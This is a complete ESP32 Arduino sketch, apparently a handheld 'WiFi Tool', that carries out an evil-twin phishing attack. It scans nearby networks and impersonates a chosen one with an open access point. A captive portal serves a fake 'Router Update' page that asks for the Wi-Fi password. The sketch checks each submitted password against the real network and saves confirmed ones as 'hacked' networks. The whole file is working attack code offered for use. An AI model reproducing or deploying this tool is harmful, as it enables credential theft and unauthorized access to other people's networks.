#include <Arduino.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <LiquidCrystal_I2C.h>
#include <Preferences.h>
#include <time.h>

// ============= التعريفات =============
LiquidCrystal_I2C lcd(0x27, 16, 2);
Preferences prefs;

const char* ntpServer = "pool.ntp.org";
const long gmtOffset_sec = 3600;
const int daylightOffset_sec = 0;

typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
  int rssi;
} _Network;

struct HackedNetwork {
  String ssid;
  String password;
  String time;
  String date;
};

const byte DNS_PORT = 53;
DNSServer dnsServer;
WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;
int _selectedIndex = 0;
int _networkCount = 0;

// زر BOOT
const int BUTTON_PIN = 0;
bool lastButtonState = HIGH;
unsigned long lastDebounceTime = 0;
const unsigned long debounceDelay = 200;

// حالة النظام
bool evilTwinActive = false;
bool scanInProgress = false;
bool passwordCaptured = false;
bool checkingPassword = false;
bool exitRequested = false;
bool showingTimer = false;
int scanStep = 0;
int currentMenu = 0;
int hackedIndex = 0;
int mainMenuSelection = 0;
unsigned long pressStartTimeGlobal = 0;

String capturedPassword = "";
String capturedNetwork = "";
String tryPassword = "";
String currentDateTime = "";

unsigned long lastScan = 0;
unsigned long evilTwinStartTime = 0;
unsigned long checkStartTime = 0;

HackedNetwork hackedNetworks[30];
int hackedCount = 0;

// ============= دوال الوقت =============
void updateDateTime() {
  struct tm timeinfo;
  if (getLocalTime(&timeinfo)) {
    char buffer[30];
    strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", &timeinfo);
    currentDateTime = String(buffer);
  }
}

String getCurrentTime() {
  struct tm timeinfo;
  if (getLocalTime(&timeinfo)) {
    char buffer[20];
    strftime(buffer, sizeof(buffer), "%H:%M:%S", &timeinfo);
    return String(buffer);
  }
  return "00:00:00";
}

String getCurrentDate() {
  struct tm timeinfo;
  if (getLocalTime(&timeinfo)) {
    char buffer[15];
    strftime(buffer, sizeof(buffer), "%Y-%m-%d", &timeinfo);
    return String(buffer);
  }
  return "2000-01-01";
}

// ============= دوال التخزين =============
void loadHackedNetworks() {
  prefs.begin("hacked", false);
  hackedCount = prefs.getInt("count", 0);
  
  for (int i = 0; i < hackedCount && i < 30; i++) {
    String key = "net" + String(i);
    String data = prefs.getString(key.c_str(), "");
    
    int firstSep = data.indexOf('|');
    int secondSep = data.indexOf('|', firstSep + 1);
    int thirdSep = data.indexOf('|', secondSep + 1);
    
    if (firstSep > 0 && secondSep > 0) {
      hackedNetworks[i].ssid = data.substring(0, firstSep);
      hackedNetworks[i].password = data.substring(firstSep + 1, secondSep);
      if (thirdSep > 0) {
        hackedNetworks[i].time = data.substring(secondSep + 1, thirdSep);
        hackedNetworks[i].date = data.substring(thirdSep + 1);
      } else {
        hackedNetworks[i].time = data.substring(secondSep + 1);
        hackedNetworks[i].date = "Unknown";
      }
    }
  }
  prefs.end();
}

void saveHackedNetwork(String ssid, String password) {
  prefs.begin("hacked", false);
  
  for (int i = 0; i < hackedCount; i++) {
    if (hackedNetworks[i].ssid == ssid) {
      prefs.end();
      return;
    }
  }
  
  if (hackedCount < 30) {
    updateDateTime();
    hackedNetworks[hackedCount].ssid = ssid;
    hackedNetworks[hackedCount].password = password;
    hackedNetworks[hackedCount].time = getCurrentTime();
    hackedNetworks[hackedCount].date = getCurrentDate();
    
    String data = ssid + "|" + password + "|" + hackedNetworks[hackedCount].time + "|" + hackedNetworks[hackedCount].date;
    String key = "net" + String(hackedCount);
    prefs.putString(key.c_str(), data);
    
    hackedCount++;
    prefs.putInt("count", hackedCount);
  }
  prefs.end();
}

// ============= دوال الخروج =============
void exitToMainMenu() {
  lcd.clear();
  lcd.setCursor(0, 0);
  lcd.print(" EXITING...");
  lcd.setCursor(0, 1);
  lcd.print(" Back to Menu");
  delay(1000);
  
  if (evilTwinActive) {
    dnsServer.stop();
    webServer.stop();
    WiFi.softAPdisconnect(true);
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
    WiFi.softAP("Dr_Mouad", "");
    dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
    webServer.begin();
    evilTwinActive = false;
  }
  
  passwordCaptured = false;
  checkingPassword = false;
  currentMenu = 0;
  mainMenuSelection = 0;
  showingTimer = false;
  
  showMainMenu();
}

// ============= عرض المؤشر =============
void showPressTimer(int seconds, bool isExit = false) {
  if (currentMenu == 0) {
    lcd.setCursor(0, 1);
    if (isExit) {
      lcd.print("EXIT:");
      lcd.print(seconds);
      lcd.print("s ");
    } else {
      lcd.print("ENT:");
      lcd.print(seconds);
      lcd.print("s ");
    }
  } 
  else if (currentMenu == 1 && !evilTwinActive) {
    lcd.clear();
    lcd.setCursor(0, 0);
    lcd.print("[");
    lcd.print(_networkCount);
    lcd.print("] ");
    
    if (_networkCount > 0) {
      String ssid = _networks[_selectedIndex].ssid;
      if (ssid.length() > 9) ssid = ssid.substring(0, 9);
      lcd.print(ssid);
    } else {
      lcd.print("No nets");
    }
    
    lcd.setCursor(0, 1);
    if (isExit) {
      lcd.print("EXIT:");
      lcd.print(seconds);
      lcd.print("s ");
    } else if (seconds >= 3) {
      lcd.print("ATTACK:");
      lcd.print(seconds);
      lcd.print("s");
    } else {
      lcd.print("CHANGE:");
      lcd.print(seconds);
      lcd.print("s");
    }
  }
  else if (currentMenu == 2) {
    lcd.clear();
    if (hackedCount > 0) {
      lcd.setCursor(0, 0);
      String ssid = hackedNetworks[hackedIndex].ssid;
      if (ssid.length() > 12) ssid = ssid.substring(0, 12);
      lcd.print(ssid);
    } else {
      lcd.setCursor(0, 0);
      lcd.print("No hacked nets");
    }
    
    lcd.setCursor(0, 1);
    if (isExit) {
      lcd.print("EXIT:");
      lcd.print(seconds);
      lcd.print("s ");
    } else if (seconds >= 3) {
      lcd.print("VIEW:");
      lcd.print(seconds);
      lcd.print("s");
    } else {
      lcd.print("NEXT:");
      lcd.print(seconds);
      lcd.print("s");
    }
  }
}

// ============= شاشة الترحيب =============
void showWelcomeScreen() {
  lcd.clear();
  lcd.setCursor(0, 0);
  lcd.print(" Dr. Mouad");
  delay(1000);
  lcd.setCursor(0, 1);
  lcd.print(" WiFi Tool");
  delay(1500);
  lcd.clear();
  lcd.setCursor(0, 0);
  lcd.print(" Welcome");
  delay(1000);
}

// ============= القائمة الرئيسية =============
void showMainMenu() {
  lcd.clear();
  lcd.setCursor(0, 0);
  if (mainMenuSelection == 0) {
    lcd.print(">1. Attack");
    lcd.setCursor(0, 1);
    lcd.print(" 2. Hacked Nets");
  } else {
    lcd.print(" 1. Attack");
    lcd.setCursor(0, 1);
    lcd.print(">2. Hacked Nets");
  }
}

void toggleMainMenu() {
  mainMenuSelection = (mainMenuSelection + 1) % 2;
  showMainMenu();
}

void enterSelectedMenu() {
  if (mainMenuSelection == 0) {
    currentMenu = 1;
    showAttackMenu();
  } else {
    currentMenu = 2;
    hackedIndex = 0;
    showHackedMenu();
  }
}

// ============= خانة الهجوم =============
void showAttackMenu() {
  lcd.clear();
  lcd.setCursor(0, 0);
  lcd.print("[");
  lcd.print(_networkCount);
  lcd.print("] Networks");
  lcd.setCursor(0, 1);
  
  if (_networkCount > 0) {
    lcd.print(">");
    String ssid = _networks[_selectedIndex].ssid;
    if (ssid.length() > 12) ssid = ssid.substring(0, 12);
    lcd.print(ssid);
    
    lcd.setCursor(14, 1);
    int rssi = _networks[_selectedIndex].rssi;
    if (rssi > -50) lcd.print("3");
    else if (rssi > -70) lcd.print("2");
    else lcd.print("1");
  } else {
    lcd.print("No networks");
  }
}

void changeNetwork() {
  if (_networkCount > 0) {
    _selectedIndex++;
    if (_selectedIndex >= _networkCount) {
      _selectedIndex = 0;
    }
    _selectedNetwork = _networks[_selectedIndex];
    showAttackMenu();
    
    lcd.clear();
    lcd.setCursor(0, 0);
    lcd.print("Selected:");
    lcd.setCursor(0, 1);
    String ssid = _selectedNetwork.ssid;
    if (ssid.length() > 15) ssid = ssid.substring(0, 15);
    lcd.print(ssid);
    delay(800);
    showAttackMenu();
  }
}

void startAttack() {
  if (_networkCount == 0) {
    lcd.clear();
    lcd.setCursor(0, 0);
    lcd.print("No networks!");
    lcd.setCursor(0, 1);
    lcd.print("Scanning...");
    delay(1500);
    performScan();
    showAttackMenu();
    return;
  }
  
  evilTwinActive = true;
  
  lcd.clear();
  lcd.setCursor(0, 0);
  lcd.print("STARTING ATTACK");
  lcd.setCursor(0, 1);
  lcd.print("Target: ");
  lcd.print(_selectedNetwork.ssid);
  delay(2000);
  
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  WiFi.softAP(_selectedNetwork.ssid.c_str());
  
  dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
  webServer.begin();
  
  evilTwinStartTime = millis();
  
  lcd.clear();
  lcd.setCursor(0, 0);
  lcd.print("EVIL TWIN ON");
  lcd.setCursor(0, 1);
  lcd.print("Waiting...");
}

// ============= خانة المخترقات =============
void showHackedMenu() {
  lcd.clear();
  
  if (hackedCount == 0) {
    lcd.setCursor(0, 0);
    lcd.print("No hacked nets");
    lcd.setCursor(0, 1);
    lcd.print("Yet!");
    return;
  }
  
  lcd.setCursor(0, 0);
  lcd.print(">");
  String ssid = hackedNetworks[hackedIndex].ssid;
  if (ssid.length() > 13) ssid = ssid.substring(0, 13);
  lcd.print(ssid);
  
  lcd.setCursor(0, 1);
  lcd.print("[");
  lcd.print(hackedNetworks[hackedIndex].date);
  lcd.print("]");
}

void changeHackedNetwork() {
  if (hackedCount > 0) {
    hackedIndex++;
    if (hackedIndex >= hackedCount) {
      hackedIndex = 0;
    }
    showHackedMenu();
  }
}

void showHackedDetails() {
  if (hackedCount == 0) return;
  
  lcd.clear();
  lcd.setCursor(0, 0);
  lcd.print("Network:");
  lcd.setCursor(0, 1);
  String ssid = hackedNetworks[hackedIndex].ssid;
  if (ssid.length() > 15) ssid = ssid.substring(0, 15);
  lcd.print(ssid);
  delay(2000);
  
  lcd.clear();
  lcd.setCursor(0, 0);
  lcd.print("Password:");
  lcd.setCursor(0, 1);
  String pwd = hackedNetworks[hackedIndex].password;
  if (pwd.length() > 15) pwd = pwd.substring(0, 15);
  lcd.print(pwd);
  delay(2000);
  
  lcd.clear();
  lcd.setCursor(0, 0);
  lcd.print("Date: ");
  lcd.print(hackedNetworks[hackedIndex].date);
  lcd.setCursor(0, 1);
  lcd.print("Time: ");
  lcd.print(hackedNetworks[hackedIndex].time);
  delay(3000);
  
  showHackedMenu();
}

// ============= مسح الشبكات =============
void performScan() {
  scanInProgress = true;
  
  int n = WiFi.scanNetworks();
  
  for (int i = 0; i < 16; i++) {
    _networks[i].ssid = "";
    _networks[i].ch = 0;
    _networks[i].rssi = -100;
  }
  _networkCount = 0;

  if (n >= 0) {
    _networkCount = (n < 16) ? n : 16;
    for (int i = 0; i < _networkCount; ++i) {
      _networks[i].ssid = WiFi.SSID(i);
      _networks[i].rssi = WiFi.RSSI(i);
      for (int j = 0; j < 6; j++) {
        _networks[i].bssid[j] = WiFi.BSSID(i)[j];
      }
      _networks[i].ch = WiFi.channel(i);
    }
    
    for (int i = 0; i < _networkCount - 1; i++) {
      for (int j = i + 1; j < _networkCount; j++) {
        if (_networks[i].rssi < _networks[j].rssi) {
          _Network temp = _networks[i];
          _networks[i] = _networks[j];
          _networks[j] = temp;
        }
      }
    }
    
    if (_selectedIndex >= _networkCount && _networkCount > 0) {
      _selectedIndex = 0;
    }
    if (_networkCount > 0) {
      _selectedNetwork = _networks[_selectedIndex];
    }
  }
  
  scanInProgress = false;
  
  if (currentMenu == 1 && !evilTwinActive) {
    showAttackMenu();
  }
}

// ============= إيقاف الهجمة =============
void stopAttackAndShowPassword(String password) {
  capturedPassword = password;
  capturedNetwork = _selectedNetwork.ssid;
  passwordCaptured = true;
  evilTwinActive = false;
  checkingPassword = false;
  
  saveHackedNetwork(capturedNetwork, capturedPassword);
  
  dnsServer.stop();
  webServer.stop();
  WiFi.softAPdisconnect(true);
  
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  WiFi.softAP("Dr_Mouad", "");
  dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
  webServer.begin();
  
  lcd.clear();
  lcd.setCursor(0, 0);
  lcd.print("PASSWORD GOT!");
  delay(1500);
  lcd.clear();
  lcd.setCursor(0, 0);
  lcd.print("Network:");
  lcd.setCursor(0, 1);
  lcd.print(capturedNetwork);
  delay(2000);
  lcd.clear();
  lcd.setCursor(0, 0);
  lcd.print("Password:");
  lcd.setCursor(0, 1);
  lcd.print(capturedPassword);
  delay(4000);
  
  passwordCaptured = false;
  currentMenu = 0;
  showMainMenu();
}

// ============= صفحة الويب =============
String getLoginPage() {
  String html = "<!DOCTYPE html><html>";
  html += "<head><meta charset='UTF-8'>";
  html += "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
  html += "<style>";
  html += "body{font-family:Arial;text-align:center;padding:20px;background:#1a1a2e;}";
  html += ".container{max-width:400px;margin:auto;background:white;padding:20px;border-radius:10px;}";
  html += "input{padding:10px;margin:10px;width:90%;border:1px solid #ccc;border-radius:5px;}";
  html += "button{padding:10px 20px;background:#0066ff;color:white;border:none;border-radius:5px;}";
  html += "h2{color:#ff6600;}";
  html += "</style>";
  html += "</head><body>";
  html += "<div class='container'>";
  html += "<h2>⚠️ Router Update</h2>";
  html += "<p>Enter WiFi password to continue</p>";
  html += "<form action='/check' method='post'>";
  html += "<input type='password' name='pwd' placeholder='Password' required>";
  html += "<br><button type='submit'>Update</button>";
  html += "</form>";
  html += "</div></body></html>";
  return html;
}

void handleRoot() {
  webServer.send(200, "text/html", getLoginPage());
}

void handleCheck() {
  if (webServer.hasArg("pwd")) {
    tryPassword = webServer.arg("pwd");
    checkingPassword = true;
    checkStartTime = millis();
    
    webServer.send(200, "text/html", "<html><body><h2>Verifying...</h2></body></html>");
    
    WiFi.disconnect();
    delay(1000);
    
    WiFi.begin(_selectedNetwork.ssid.c_str(), 
               tryPassword.c_str(), 
               _selectedNetwork.ch,
               _selectedNetwork.bssid);
    
    delay(5000);
    
    if (WiFi.status() == WL_CONNECTED) {
      stopAttackAndShowPassword(tryPassword);
    } else {
      checkingPassword = false;
    }
  } else {
    webServer.send(200, "text/html", getLoginPage());
  }
}

void handleNotFound() {
  webServer.send(200, "text/html", getLoginPage());
}

// ============= SETUP =============
void setup() {
  Serial.begin(115200);
  
  lcd.init();
  lcd.backlight();
  
  pinMode(BUTTON_PIN, INPUT_PULLUP);
  
  configTime(gmtOffset_sec, daylightOffset_sec, ntpServer);
  
  loadHackedNetworks();
  
  showWelcomeScreen();
  
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  WiFi.softAP("Dr_Mouad", "");
  
  dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
  
  webServer.on("/", handleRoot);
  webServer.on("/check", HTTP_POST, handleCheck);
  webServer.onNotFound(handleNotFound);
  webServer.begin();
  
  performScan();
  
  currentMenu = 0;
  mainMenuSelection = 0;
  showMainMenu();
}

// ============= LOOP =============
void loop() {
  static unsigned long pressStartTime = 0;
  static bool isPressing = false;
  static bool exitTriggered = false;
  static unsigned long lastTimerUpdate = 0;
  
  bool reading = digitalRead(BUTTON_PIN);
  
  // كشف الضغط
  if (reading == LOW && lastButtonState == HIGH) {
    if (!checkingPassword) {
      pressStartTime = millis();
      isPressing = true;
      exitTriggered = false;
      showingTimer = true;
      lastTimerUpdate = 0;
    }
  }
  
  // عرض المؤشر أثناء الضغط
  if (reading == LOW && isPressing && !exitTriggered && showingTimer) {
    unsigned long pressDuration = millis() - pressStartTime;
    int seconds = (pressDuration / 1000) + 1;
    
    if (millis() - lastTimerUpdate >= 100) {
      lastTimerUpdate = millis();
      
      if (pressDuration >= 5000) {
        showPressTimer(seconds, true);
      } else {
        showPressTimer(seconds, false);
      }
    }
    
    if (pressDuration >= 5000 && !exitTriggered && currentMenu != 0) {
      exitTriggered = true;
      exitToMainMenu();
      isPressing = false;
      showingTimer = false;
      lastButtonState = digitalRead(BUTTON_PIN);
      return;
    }
  }
  
  // عند رفع الضغط
  if (reading == HIGH && lastButtonState == LOW && isPressing) {
    unsigned long pressDuration = millis() - pressStartTime;
    isPressing = false;
    showingTimer = false;
    
    if (exitTriggered) {
      exitTriggered = false;
      lastButtonState = reading;
      if (currentMenu == 0) showMainMenu();
      else if (currentMenu == 1) showAttackMenu();
      else if (currentMenu == 2) showHackedMenu();
      return;
    }
    
    // القائمة الرئيسية
    if (currentMenu == 0 && !evilTwinActive && !passwordCaptured) {
      if (pressDuration >= 1500 && pressDuration < 2500) {
        enterSelectedMenu();
      } else if (pressDuration < 1000) {
        toggleMainMenu();
      }
    }
    // خانة الهجوم
    else if (currentMenu == 1 && !evilTwinActive && !passwordCaptured) {
      if (pressDuration >= 2500) {
        startAttack();
      } else if (pressDuration < 1000) {
        changeNetwork();
      }
    }
    // خانة المخترقات
    else if (currentMenu == 2 && !evilTwinActive && !passwordCaptured) {
      if (pressDuration >= 2500) {
        showHackedDetails();
      } else if (pressDuration < 1000) {
        changeHackedNetwork();
      }
    }
    
    if (!evilTwinActive && !passwordCaptured) {
      if (currentMenu == 0) showMainMenu();
      else if (currentMenu == 1) showAttackMenu();
      else if (currentMenu == 2) showHackedMenu();
    }
  }
  
  lastButtonState = reading;
  
  // تشغيل الخدمات أثناء الهجمة
  if (evilTwinActive && !passwordCaptured) {
    dnsServer.processNextRequest();
    webServer.handleClient();
  }
  
  // إعادة المسح التلقائي
  if (!evilTwinActive && !passwordCaptured && !checkingPassword && (millis() - lastScan >= 15000) && !scanInProgress) {
    performScan();
    lastScan = millis();
  }
  
  // تحديث الشاشة
  static unsigned long lastUpdate = 0;
  if (millis() - lastUpdate >= 500) {
    if (!checkingPassword && !passwordCaptured && !showingTimer) {
      if (currentMenu == 1 && !evilTwinActive) {
        showAttackMenu();
      } else if (currentMenu == 2) {
        showHackedMenu();
      } else if (currentMenu == 0) {
        showMainMenu();
      }
    }
    lastUpdate = millis();
  }
  
  if (scanInProgress) {
    scanStep++;
    delay(100);
  }
}
